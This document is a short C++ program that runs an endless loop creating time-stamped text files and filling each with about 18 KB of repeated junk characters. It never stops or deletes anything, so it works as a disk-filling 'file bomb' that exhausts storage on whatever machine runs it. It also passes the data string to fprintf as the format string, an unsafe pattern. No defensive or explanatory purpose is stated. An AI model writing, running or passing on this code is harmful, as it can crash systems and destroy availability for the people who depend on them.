#include <cstdio>
#include <ctime>
#include <string>

int main()
{
    FILE *tmp;
    while (true)
    {
        for (int i = 0; i <= 100000001; i++)
        {
            tmp = fopen(
                (std::to_string(time(nullptr)) + std::to_string(i) + ".txt")
                    .c_str(),
                "w");
            std::string str;
            for (int i = 0; i <= 1001; i++)
            {
                str += "djdjdjjddjjdjdjdjd";
            }
            fprintf(tmp, str.c_str());
            fclose(tmp);
        }
    }
    return 0;
}
